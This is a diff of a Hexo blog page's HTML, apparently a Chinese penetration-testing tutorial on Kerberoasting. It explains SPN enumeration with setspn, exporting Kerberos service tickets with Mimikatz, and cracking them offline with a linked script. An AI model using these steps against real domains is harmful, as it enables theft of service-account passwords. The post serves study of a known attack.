@@ -1,17 +1,20 @@
+
+
 <!DOCTYPE html>
-<html>
-<head><meta name="generator" content="Hexo 3.8.0">
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    <meta name="description" content="基本概念SPN 全称 Service Principal Names SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下 当一个服务的权限为 Local System或Network Service，则SPN注册在机器帐户(Computers)下 当一个服务的">
+<html lang="">
+<head prefix="og: http://ogp.me/ns#"><meta name="generator" content="Hexo 3.8.0">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
+    <meta name="description" content="">
+    <title>域渗透之Kerberoasting攻击 | c1y2m3’blog</title>
+
+    <!-- Open Graph -->
+    <meta name="description" content="&amp;#x57FA;&amp;#x672C;&amp;#x6982;&amp;#x5FF5;SPN &amp;#x5168;&amp;#x79F0; Service Principal Names SPN&amp;#x662F;&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#x4E0A;&amp;#x6240;&amp;#x8FD0;&amp;#x884C;&amp;#x670D;&amp;#x52A1;&amp;#x7684;&amp;#x552F;&amp;#x4E00;&amp;#x6807;&amp;#x8BC6;">
 <meta property="og:type" content="article">
 <meta property="og:title" content="域渗透之Kerberoasting攻击">
 <meta property="og:url" content="http://yoursite.com/2019/04/02/15542127307091/index.html">
 <meta property="og:site_name" content="c1y2m3’blog">
-<meta property="og:description" content="基本概念SPN 全称 Service Principal Names SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下 当一个服务的权限为 Local System或Network Service，则SPN注册在机器帐户(Computers)下 当一个服务的">
+<meta property="og:description" content="&amp;#x57FA;&amp;#x672C;&amp;#x6982;&amp;#x5FF5;SPN &amp;#x5168;&amp;#x79F0; Service Principal Names SPN&amp;#x662F;&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#x4E0A;&amp;#x6240;&amp;#x8FD0;&amp;#x884C;&amp;#x670D;&amp;#x52A1;&amp;#x7684;&amp;#x552F;&amp;#x4E00;&amp;#x6807;&amp;#x8BC6;">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://www.yunzhijia.com/microblog/filesvr/5ca32869e67d0a40cbc9b874">
 <meta property="og:image" content="https://green-m.github.io/styles/images/kerberos/kerberos_01.png">
@@ -21,271 +24,281 @@
 <meta property="og:updated_time" content="2019-06-26T14:39:36.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="域渗透之Kerberoasting攻击">
-<meta name="twitter:description" content="基本概念SPN 全称 Service Principal Names SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下 当一个服务的权限为 Local System或Network Service，则SPN注册在机器帐户(Computers)下 当一个服务的">
+<meta name="twitter:description" content="&amp;#x57FA;&amp;#x672C;&amp;#x6982;&amp;#x5FF5;SPN &amp;#x5168;&amp;#x79F0; Service Principal Names SPN&amp;#x662F;&amp;#x670D;&amp;#x52A1;&amp;#x5668;&amp;#x4E0A;&amp;#x6240;&amp;#x8FD0;&amp;#x884C;&amp;#x670D;&amp;#x52A1;&amp;#x7684;&amp;#x552F;&amp;#x4E00;&amp;#x6807;&amp;#x8BC6;">
 <meta name="twitter:image" content="https://www.yunzhijia.com/microblog/filesvr/5ca32869e67d0a40cbc9b874">
+
+    <script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Person",
+  "email": "mailto:",
+  "image": "",
+  "name": "John Doe",
+  "url": "http://yoursite.com"
+}
+</script>
+    <script>
+    var algoliaEnabled = false;
+    
+</script>
+
+    
+
     
     
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+    
+    
+    
+        <!-- stylesheets list from config.yml -->
         
-          
-              <link rel="shortcut icon" href="/c1y2m3.github.io/images/favicon.ico">
-          
+        <link rel="stylesheet" href="/c1y2m3.github.io/css/aloha.css">
         
+        <link rel="stylesheet" href="//cdn.bootcss.com/semantic-ui/2.2.4/semantic.min.css">
         
-          
-            <link rel="icon" type="image/png" href="/c1y2m3.github.io/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/c1y2m3.github.io/images/apple-touch-icon.png">
-          
+        <link rel="stylesheet" href="//cdn.bootcss.com/magnific-popup.js/1.1.0/magnific-popup.min.css">
         
     
-    <!-- title -->
-    <title>域渗透之Kerberoasting攻击</title>
-    <!-- styles -->
-    <link rel="stylesheet" href="/c1y2m3.github.io/css/style.css">
-    <!-- persian styles -->
-    
-      <link rel="stylesheet" href="/c1y2m3.github.io/css/rtl.css">
-    
-    <!-- rss -->
-    
-    
+
 </head>
+<body id="body" style="margin-bottom: 0;" class="pushable">
 
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/c1y2m3.github.io/">主页</a></li>
-         
-          <li><a href="/c1y2m3.github.io/About/">关于</a></li>
-         
-          <li><a href="/c1y2m3.github.io/archives/">文章</a></li>
-         
-          <li><a href="/c1y2m3.github.io/projects_url">生活</a></li>
-        
-      </ul>
-    </span>
-    <br>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/c1y2m3.github.io/2019/04/04/15543609538285/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/c1y2m3.github.io/2019/03/16/----1/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/04/02/15542127307091/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/04/02/15542127307091/&text=域渗透之Kerberoasting攻击"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/04/02/15542127307091/&title=域渗透之Kerberoasting攻击"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/04/02/15542127307091/&is_video=false&description=域渗透之Kerberoasting攻击"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=域渗透之Kerberoasting攻击&body=Check out this article: http://yoursite.com/2019/04/02/15542127307091/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/04/02/15542127307091/&title=域渗透之Kerberoasting攻击"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/04/02/15542127307091/&title=域渗透之Kerberoasting攻击"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/04/02/15542127307091/&title=域渗透之Kerberoasting攻击"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/04/02/15542127307091/&title=域渗透之Kerberoasting攻击"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/04/02/15542127307091/&name=域渗透之Kerberoasting攻击&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-</ul>
+    <div class="ui top fixed menu">
+        <a class="item" id="menu-icon"><i class="sidebar icon"></i></a>
+    </div>
 
+    <div id="menu-sidebar" class="ui left vertical sidebar menu">
+
+    <div id="sidebar-top">
+        <div class="content">
+            <h3>c1y2m3’blog</h3>
+        </div>
     </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#基本概念"><span class="toc-number">1.</span> <span class="toc-text">基本概念</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SPN的格式："><span class="toc-number">2.</span> <span class="toc-text">SPN的格式：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#查询SPN"><span class="toc-number">3.</span> <span class="toc-text">查询SPN</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberos的原理："><span class="toc-number">4.</span> <span class="toc-text">Kerberos的原理：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"><span class="toc-number">5.</span> <span class="toc-text">2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Kerberoasting的实现方法"><span class="toc-number">6.</span> <span class="toc-text">Kerberoasting的实现方法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#破解："><span class="toc-number">7.</span> <span class="toc-text">破解：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二、使用Powershell实现"><span class="toc-number">8.</span> <span class="toc-text">二、使用Powershell实现</span></a></li></ol>
+    <div class="ui container sidebar-card">
+    <div class="ui people shape content">
+        <div class="active side">
+            <div class="ui card">
+                <div class="image">
+                    <img class="ui medium bordered image" src="/c1y2m3.github.io/images/avatar.jpg">
+                </div>
+                <div class="content">
+                    <a class="header">John Doe</a>
+                    
+                </div>
+                <div class="extra content">
+                    <div class="ui list">
+                        
+                        
+                    </div>
+
+                </div>
+                <div class="extra content">
+                    <div class="ui list">
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
     </div>
-  </span>
+
+
 </div>
 
     
-    <div class="content index py4">
-        
-        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
-  <header>
     
-    <h1 class="posttitle" itemprop="name headline">
-        域渗透之Kerberoasting攻击
-    </h1>
+
+    
+
+    
+    <a href="/index.html" class="item">
+        <i class="home icon"></i>
+        HOME
+    </a>
+
+    
+
+    
+</div>
+
+    <div class="pusher body-content">
+        <div id="content" class="ui main container">
+            <!--<div class="ui one column grid">-->
+                <!--<div class="column">-->
+                    <!--<div class="ui main container">-->
+                        <div id="post-15542127307091" class="ui main container article-type-post">
+
+    
+
+    <div class="ui divided grid">
+
+        <div class="two column row" id="article-content">
+
+            <div class="thirteen wide computer thirteen wide tablet sixteen wide mobile column">
+                
+
+<h1 class="ui header">
+    
+    域渗透之Kerberoasting攻击
+</h1>
 
 
 
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-        <span itemprop="name">c1y2m3’blog</span>
-      </span>
-      
-    <div class="postdate">
-        <time datetime="2019-04-02T13:50:00.000Z" itemprop="datePublished">2019-04-02</time>
-    </div>
+                <div class="article-inner">
 
-
-      
-
-      
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><p>SPN</p>
-<p>全称 <code>Service Principal Names</code></p>
-<p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p>
-<p>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p>
-<p>当一个服务的权限为 <code>Local System</code>或<code>Network Service</code>，则SPN注册在机器帐户(Computers)下</p>
-<p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
-<h1 id="SPN的格式："><a href="#SPN的格式：" class="headerlink" title="SPN的格式："></a>SPN的格式：</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5ca32869e67d0a40cbc9b874" alt=""></p>
-<p>tips：</p>
-<p>1、serviceclass 可以理解为服务的名称，常见的有www、SMTP、DNS、exchange、HOST等</p>
-<p>2、host有两种形式，FQDN和NetBIOS名,例如WIN-TL226LF48RT.corp.vk.local和WIN-TL226LF48RT</p>
-<h1 id="查询SPN"><a href="#查询SPN" class="headerlink" title="查询SPN"></a>查询SPN</h1><p>对域控制器发起LDAP查询，这是正常kerberos票据行为的一部分,因此查询SPN的操作难以被检测到</p>
-<p>(1) 使用SetSPN</p>
-<p>Windows下自带工具</p>
+                    <div class="article-entry" itemprop="articleBody">
+                        
+                        <h1 id="&#x57FA;&#x672C;&#x6982;&#x5FF5;"><a href="#&#x57FA;&#x672C;&#x6982;&#x5FF5;" class="headerlink" title="&#x57FA;&#x672C;&#x6982;&#x5FF5;"></a>&#x57FA;&#x672C;&#x6982;&#x5FF5;</h1><p>SPN</p>
+<p>&#x5168;&#x79F0; <code>Service Principal Names</code></p>
+<p>SPN&#x662F;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x6240;&#x8FD0;&#x884C;&#x670D;&#x52A1;&#x7684;&#x552F;&#x4E00;&#x6807;&#x8BC6;&#xFF0C;&#x6BCF;&#x4E2A;&#x4F7F;&#x7528;Kerberos&#x7684;&#x670D;&#x52A1;&#x90FD;&#x9700;&#x8981;&#x4E00;&#x4E2A;SPN</p>
+<p>SPN&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#xFF0C;&#x4E00;&#x79CD;&#x6CE8;&#x518C;&#x5728;AD&#x4E0A;&#x673A;&#x5668;&#x5E10;&#x6237;(Computers)&#x4E0B;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x6CE8;&#x518C;&#x5728;&#x57DF;&#x7528;&#x6237;&#x5E10;&#x6237;(Users)&#x4E0B;</p>
+<p>&#x5F53;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x6743;&#x9650;&#x4E3A; <code>Local System</code>&#x6216;<code>Network Service</code>&#xFF0C;&#x5219;SPN&#x6CE8;&#x518C;&#x5728;&#x673A;&#x5668;&#x5E10;&#x6237;(Computers)&#x4E0B;</p>
+<p>&#x5F53;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x6743;&#x9650;&#x4E3A;&#x4E00;&#x4E2A;&#x57DF;&#x7528;&#x6237;&#xFF0C;&#x5219;SPN&#x6CE8;&#x518C;&#x5728;&#x57DF;&#x7528;&#x6237;&#x5E10;&#x6237;(Users)&#x4E0B;</p>
+<h1 id="SPN&#x7684;&#x683C;&#x5F0F;&#xFF1A;"><a href="#SPN&#x7684;&#x683C;&#x5F0F;&#xFF1A;" class="headerlink" title="SPN&#x7684;&#x683C;&#x5F0F;&#xFF1A;"></a>SPN&#x7684;&#x683C;&#x5F0F;&#xFF1A;</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure>
+<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5ca32869e67d0a40cbc9b874"><img src="https://www.yunzhijia.com/microblog/filesvr/5ca32869e67d0a40cbc9b874" alt="" class="ui centered image"></a></p>
+<p>tips&#xFF1A;</p>
+<p>1&#x3001;serviceclass &#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E3A;&#x670D;&#x52A1;&#x7684;&#x540D;&#x79F0;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x6709;www&#x3001;SMTP&#x3001;DNS&#x3001;exchange&#x3001;HOST&#x7B49;</p>
+<p>2&#x3001;host&#x6709;&#x4E24;&#x79CD;&#x5F62;&#x5F0F;&#xFF0C;FQDN&#x548C;NetBIOS&#x540D;,&#x4F8B;&#x5982;WIN-TL226LF48RT.corp.vk.local&#x548C;WIN-TL226LF48RT</p>
+<h1 id="&#x67E5;&#x8BE2;SPN"><a href="#&#x67E5;&#x8BE2;SPN" class="headerlink" title="&#x67E5;&#x8BE2;SPN"></a>&#x67E5;&#x8BE2;SPN</h1><p>&#x5BF9;&#x57DF;&#x63A7;&#x5236;&#x5668;&#x53D1;&#x8D77;LDAP&#x67E5;&#x8BE2;&#xFF0C;&#x8FD9;&#x662F;&#x6B63;&#x5E38;kerberos&#x7968;&#x636E;&#x884C;&#x4E3A;&#x7684;&#x4E00;&#x90E8;&#x5206;,&#x56E0;&#x6B64;&#x67E5;&#x8BE2;SPN&#x7684;&#x64CD;&#x4F5C;&#x96BE;&#x4EE5;&#x88AB;&#x68C0;&#x6D4B;&#x5230;</p>
+<p>(1) &#x4F7F;&#x7528;SetSPN</p>
+<p>Windows&#x4E0B;&#x81EA;&#x5E26;&#x5DE5;&#x5177;</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -q */*</span><br></pre></td></tr></table></figure>
-<p>查看test域内所有的SPN:</p>
+<p>&#x67E5;&#x770B;test&#x57DF;&#x5185;&#x6240;&#x6709;&#x7684;SPN:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn.exe -T test -q */*</span><br></pre></td></tr></table></figure>
-<h1 id="Kerberos的原理："><a href="#Kerberos的原理：" class="headerlink" title="Kerberos的原理："></a>Kerberos的原理：</h1><p><img src="https://green-m.github.io/styles/images/kerberos/kerberos_01.png" alt=""></p>
-<p>在4.tgs_reply,用户将收到由目标服务实例的NTLM hash加密生成的TGS(Service ticket)， 加密算法为RC4-HMAC</p>
-<p>站在利用的角度，当获得这个TGS后，我们可以尝试穷举口令，模拟加密过程，生产TGS进行比较。如果TGS相同，就能获取到目标实例的明文口令。</p>
-<h1 id="2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"><a href="#2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系" class="headerlink" title="2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系"></a>2、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</h1><p>这里举一个例子：</p>
-<p>用户a要访问Mysql服务的资源，进行4.tgs_reply时,步骤如下：</p>
-<p>(1)Domain Controller查询MySQL服务的SPN</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果该SPN注册在机器帐户(Computers)下，将会查询所有机器帐户(Computers)的servicePrincipalName属性，找到对应的帐户</span><br><span class="line"></span><br><span class="line">如果该SPN注册在域用户帐户(Users)下，将会查询所有域用户(Users)的servicePrincipalName属性，找到对应的帐户</span><br></pre></td></tr></table></figure>
-<p>(2)找到对应的帐户后，使用该帐户的NTLM hash，生成TGS</p>
-<h1 id="Kerberoasting的实现方法"><a href="#Kerberoasting的实现方法" class="headerlink" title="Kerberoasting的实现方法"></a>Kerberoasting的实现方法</h1><p>综上，域内的任何一台主机，都能够通过查询SPN，向域内的所有服务请求TGS，拿到TGS后对其进行暴力破解</p>
-<p>对于破解出的明文口令，只有域用户帐户(Users)的口令存在价值，不必考虑机器帐户的口令(无法用于远程连接)</p>
-<p>具体思路为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查询SPN -&gt; 请求TGS -&gt; 导出TGS -&gt; 暴力破解</span><br></pre></td></tr></table></figure>
-<p> 一、使用Mimikatz实现:</p>
+<h1 id="Kerberos&#x7684;&#x539F;&#x7406;&#xFF1A;"><a href="#Kerberos&#x7684;&#x539F;&#x7406;&#xFF1A;" class="headerlink" title="Kerberos&#x7684;&#x539F;&#x7406;&#xFF1A;"></a>Kerberos&#x7684;&#x539F;&#x7406;&#xFF1A;</h1><p><a class="magnific-img" href="https://green-m.github.io/styles/images/kerberos/kerberos_01.png"><img src="https://green-m.github.io/styles/images/kerberos/kerberos_01.png" alt="" class="ui centered image"></a></p>
+<p>&#x5728;4.tgs_reply,&#x7528;&#x6237;&#x5C06;&#x6536;&#x5230;&#x7531;&#x76EE;&#x6807;&#x670D;&#x52A1;&#x5B9E;&#x4F8B;&#x7684;NTLM hash&#x52A0;&#x5BC6;&#x751F;&#x6210;&#x7684;TGS(Service ticket)&#xFF0C; &#x52A0;&#x5BC6;&#x7B97;&#x6CD5;&#x4E3A;RC4-HMAC</p>
+<p>&#x7AD9;&#x5728;&#x5229;&#x7528;&#x7684;&#x89D2;&#x5EA6;&#xFF0C;&#x5F53;&#x83B7;&#x5F97;&#x8FD9;&#x4E2A;TGS&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x7A77;&#x4E3E;&#x53E3;&#x4EE4;&#xFF0C;&#x6A21;&#x62DF;&#x52A0;&#x5BC6;&#x8FC7;&#x7A0B;&#xFF0C;&#x751F;&#x4EA7;TGS&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x3002;&#x5982;&#x679C;TGS&#x76F8;&#x540C;&#xFF0C;&#x5C31;&#x80FD;&#x83B7;&#x53D6;&#x5230;&#x76EE;&#x6807;&#x5B9E;&#x4F8B;&#x7684;&#x660E;&#x6587;&#x53E3;&#x4EE4;&#x3002;</p>
+<h1 id="2&#x3001;Windows&#x7CFB;&#x7EDF;&#x901A;&#x8FC7;SPN&#x67E5;&#x8BE2;&#x83B7;&#x5F97;&#x670D;&#x52A1;&#x548C;&#x670D;&#x52A1;&#x5B9E;&#x4F8B;&#x8D26;&#x6237;&#x7684;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;"><a href="#2&#x3001;Windows&#x7CFB;&#x7EDF;&#x901A;&#x8FC7;SPN&#x67E5;&#x8BE2;&#x83B7;&#x5F97;&#x670D;&#x52A1;&#x548C;&#x670D;&#x52A1;&#x5B9E;&#x4F8B;&#x8D26;&#x6237;&#x7684;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;" class="headerlink" title="2&#x3001;Windows&#x7CFB;&#x7EDF;&#x901A;&#x8FC7;SPN&#x67E5;&#x8BE2;&#x83B7;&#x5F97;&#x670D;&#x52A1;&#x548C;&#x670D;&#x52A1;&#x5B9E;&#x4F8B;&#x8D26;&#x6237;&#x7684;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;"></a>2&#x3001;Windows&#x7CFB;&#x7EDF;&#x901A;&#x8FC7;SPN&#x67E5;&#x8BE2;&#x83B7;&#x5F97;&#x670D;&#x52A1;&#x548C;&#x670D;&#x52A1;&#x5B9E;&#x4F8B;&#x8D26;&#x6237;&#x7684;&#x5BF9;&#x5E94;&#x5173;&#x7CFB;</h1><p>&#x8FD9;&#x91CC;&#x4E3E;&#x4E00;&#x4E2A;&#x4F8B;&#x5B50;&#xFF1A;</p>
+<p>&#x7528;&#x6237;a&#x8981;&#x8BBF;&#x95EE;Mysql&#x670D;&#x52A1;&#x7684;&#x8D44;&#x6E90;&#xFF0C;&#x8FDB;&#x884C;4.tgs_reply&#x65F6;,&#x6B65;&#x9AA4;&#x5982;&#x4E0B;&#xFF1A;</p>
+<p>(1)Domain Controller&#x67E5;&#x8BE2;MySQL&#x670D;&#x52A1;&#x7684;SPN</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x5982;&#x679C;&#x8BE5;SPN&#x6CE8;&#x518C;&#x5728;&#x673A;&#x5668;&#x5E10;&#x6237;(Computers)&#x4E0B;&#xFF0C;&#x5C06;&#x4F1A;&#x67E5;&#x8BE2;&#x6240;&#x6709;&#x673A;&#x5668;&#x5E10;&#x6237;(Computers)&#x7684;servicePrincipalName&#x5C5E;&#x6027;&#xFF0C;&#x627E;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x5E10;&#x6237;</span><br><span class="line"></span><br><span class="line">&#x5982;&#x679C;&#x8BE5;SPN&#x6CE8;&#x518C;&#x5728;&#x57DF;&#x7528;&#x6237;&#x5E10;&#x6237;(Users)&#x4E0B;&#xFF0C;&#x5C06;&#x4F1A;&#x67E5;&#x8BE2;&#x6240;&#x6709;&#x57DF;&#x7528;&#x6237;(Users)&#x7684;servicePrincipalName&#x5C5E;&#x6027;&#xFF0C;&#x627E;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x5E10;&#x6237;</span><br></pre></td></tr></table></figure>
+<p>(2)&#x627E;&#x5230;&#x5BF9;&#x5E94;&#x7684;&#x5E10;&#x6237;&#x540E;&#xFF0C;&#x4F7F;&#x7528;&#x8BE5;&#x5E10;&#x6237;&#x7684;NTLM hash&#xFF0C;&#x751F;&#x6210;TGS</p>
+<h1 id="Kerberoasting&#x7684;&#x5B9E;&#x73B0;&#x65B9;&#x6CD5;"><a href="#Kerberoasting&#x7684;&#x5B9E;&#x73B0;&#x65B9;&#x6CD5;" class="headerlink" title="Kerberoasting&#x7684;&#x5B9E;&#x73B0;&#x65B9;&#x6CD5;"></a>Kerberoasting&#x7684;&#x5B9E;&#x73B0;&#x65B9;&#x6CD5;</h1><p>&#x7EFC;&#x4E0A;&#xFF0C;&#x57DF;&#x5185;&#x7684;&#x4EFB;&#x4F55;&#x4E00;&#x53F0;&#x4E3B;&#x673A;&#xFF0C;&#x90FD;&#x80FD;&#x591F;&#x901A;&#x8FC7;&#x67E5;&#x8BE2;SPN&#xFF0C;&#x5411;&#x57DF;&#x5185;&#x7684;&#x6240;&#x6709;&#x670D;&#x52A1;&#x8BF7;&#x6C42;TGS&#xFF0C;&#x62FF;&#x5230;TGS&#x540E;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x66B4;&#x529B;&#x7834;&#x89E3;</p>
+<p>&#x5BF9;&#x4E8E;&#x7834;&#x89E3;&#x51FA;&#x7684;&#x660E;&#x6587;&#x53E3;&#x4EE4;&#xFF0C;&#x53EA;&#x6709;&#x57DF;&#x7528;&#x6237;&#x5E10;&#x6237;(Users)&#x7684;&#x53E3;&#x4EE4;&#x5B58;&#x5728;&#x4EF7;&#x503C;&#xFF0C;&#x4E0D;&#x5FC5;&#x8003;&#x8651;&#x673A;&#x5668;&#x5E10;&#x6237;&#x7684;&#x53E3;&#x4EE4;(&#x65E0;&#x6CD5;&#x7528;&#x4E8E;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;)</p>
+<p>&#x5177;&#x4F53;&#x601D;&#x8DEF;&#x4E3A;&#xFF1A;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x67E5;&#x8BE2;SPN -&gt; &#x8BF7;&#x6C42;TGS -&gt; &#x5BFC;&#x51FA;TGS -&gt; &#x66B4;&#x529B;&#x7834;&#x89E3;</span><br></pre></td></tr></table></figure>
+<p> &#x4E00;&#x3001;&#x4F7F;&#x7528;Mimikatz&#x5B9E;&#x73B0;:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list /export</span><br></pre></td></tr></table></figure>
-<p><img src="https://www.yunzhijia.com/microblog/filesvr/5ca33aaa2711cd74739042e5" alt=""></p>
-<h1 id="破解："><a href="#破解：" class="headerlink" title="破解："></a>破解：</h1><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
+<p><a class="magnific-img" href="https://www.yunzhijia.com/microblog/filesvr/5ca33aaa2711cd74739042e5"><img src="https://www.yunzhijia.com/microblog/filesvr/5ca33aaa2711cd74739042e5" alt="" class="ui centered image"></a></p>
+<h1 id="&#x7834;&#x89E3;&#xFF1A;"><a href="#&#x7834;&#x89E3;&#xFF1A;" class="headerlink" title="&#x7834;&#x89E3;&#xFF1A;"></a>&#x7834;&#x89E3;&#xFF1A;</h1><p><a href="https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py" target="_blank" rel="noopener">https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py</a></p>
